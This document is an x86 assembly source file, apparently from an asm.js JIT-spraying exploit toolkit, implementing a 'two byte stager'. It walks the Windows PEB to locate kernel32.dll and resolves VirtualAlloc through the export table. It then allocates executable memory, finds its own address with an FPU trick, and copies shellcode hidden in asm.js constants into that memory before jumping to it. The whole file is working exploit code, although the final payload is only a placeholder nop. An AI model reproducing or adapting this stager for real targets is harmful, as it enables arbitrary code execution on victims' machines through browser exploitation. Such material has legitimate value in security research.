; two byte stager for sc2asmjs.py

; all opcodes <= 2 bytes except movs
; movs are going to get transformed

BITS 32
%define PAYLOAD_SIZE 12
;%define DISTANCE 0x1c ; distance between asm.js constants
%define DISTANCE 5 ; distance between asm.js constants

_start:

push 0x30
pop esi
dw 0xad64       ; lodsd eax, fs:[esi] with segment override prefix

push 0xC
pop ebx
add ebx, eax
mov eax, [ebx]

push 0x1C
pop ebx
add ebx, eax
mov ebx, [ebx]  ;loader.InitOrder

; push 'kernel32.dll\0\0\0\0'
push 0
mov ecx, '.DLL'
push ecx
mov ecx, 'EL32'
push ecx
mov ecx, 'KERN'
push ecx

; search for kernel32.dll in memory
NextModule:
    push 14 
    pop ecx
    mov edi, esp                  ; addr of KERNEL.DLL string
    dec edi
    push 8
    pop eax
    add eax, ebx
    mov ebp, [eax]
    ;-- 
    push 0x20
    pop eax
    add eax, ebx
    mov esi, [eax]
    ;--
    mov ebx, [ebx]               ; addr of next module
    isCharEqual:
        inc edi
        dec ecx
            jecxz GetFuncOrd     ; break if found
        xor eax, eax
        lodsw
        cmp al, 0x61
        jl SHORT isUpper
            sub al, 0x20
        isUpper:
        cmp al, [edi]
        je SHORT isCharEqual
    jmp SHORT NextModule


GetFuncOrd:
    ; push VirtualAlloc\0
    push 0
    mov ecx, 'lloc'
    push ecx
    mov ecx, 'ualA'
    push ecx
    mov ecx, 'Virt'
    push ecx

    mov ebx, ebp            ; module base
    push 0x3c               ; PE header offset
    pop eax
    add eax, ebx
    ;--
    mov eax, [eax]          ; PE header address
    ;--
    add eax, ebx            ; PE header
    ;--
    push 0x78               ; export table offset
    pop ebp
    add eax, ebp
    ;--
    mov eax, [eax]
    ;--
    add eax, ebx            ; export table
    mov ebp, eax
    ;--

    push 0x20
    pop eax
    add eax, ebp
    mov eax, [eax]
    ; --
    add eax, ebx            ; absolute
    xor edx, edx

    NextFunc:
        mov edi, esp            ; addr of VirtualAlloc\0
        push 13
        pop ecx                 ; len(VirtualAlloc\0)
        ;mov esi, [eax + edx]
        push eax                ; save ptr to names
        add eax, edx
        mov esi, [eax]
        ; --
        add esi, ebx
        repe cmpsb              ; repe cmpsb [esi], [esi]
            pop eax             ; restore ptr to names
            jecxz GetFuncAddr 
        ;add edx, 4
        push 4
        pop esi
        add edx, esi
        ; --
        jmp SHORT NextFunc
        
GetFuncAddr:
    push 0x24
    pop eax
    add eax, ebp
    mov eax, [eax]
    ;--

    add eax, ebx            ; add base
    shr edx, 1
    add eax, edx            ; add ordinal index

    mov edx, [eax]
    xor eax, eax
    mov ah, 0xff
    mov al, 0xff
    and eax, edx 
    ;--

    push 0x1c
    pop edx
    add edx, ebp
    mov edx, [edx]
    ; --

    add edx, ebx            ; add base
    shl eax, 1
    shl eax, 1
    add edx, eax            ; add function ptr index
    mov edx, [edx]          ; relative VirtualAlloc in eax
    add edx, ebx            ; VirtualAlloc in EDX

CallVirtualAlloc:
    push 0x40               ; flProtect PAGE_EXECUTE_READWRITE
    xor ebx, ebx
    mov bh, 0x30
    push ebx                ; flAllocationType MEM_COMMIT | MEM_RESERVE
    mov bh, 0x10
    push ebx                ; dwSize 0x1000 
    push 0
    call edx                ; VirtualAlloc; RWX region returned in EAX
    
GetPC: 
    fldpi
    push 0xc 
    pop esi
    add esi, esp
    mov ebx, esp
    fnstenv [ebx]
    ;--- 
    mov esi, [esi]              ; GetPC in ESI
    push byte (Shellcode - GetPC)/2 ; FIXME
    pop edi
    add esi, edi
    add esi, edi                ; Shellcode in ESI
    ; -- 
    mov edi, eax                ; RWX region in EDI
    
xor ecx, ecx            ;
mov ch, ((PAYLOAD_SIZE/4) >> 8) & 0xff
mov cl, (PAYLOAD_SIZE/4) & 0xff
push DISTANCE
pop ebx

; read shellcode opcode bytes hidden in asm.js constants and write them to RWX memory
CopyShellcode:
    movsd
    add esi, ebx
    loop CopyShellcode
    
Jmp2Shellcode:
    jmp eax                 ; never return
    
; will be replaced; DO NOT EDIT
; need shellcode_size % 4 == 0 (**1)
Shellcode:
    ;nop dword [esp]
    ;db 'AAAAA'
    ;nop
    ;nop
    ;nop
    ;nop
    ;db 'AAAAA'
    ;int3
    ;nop
    ;nop
    nop
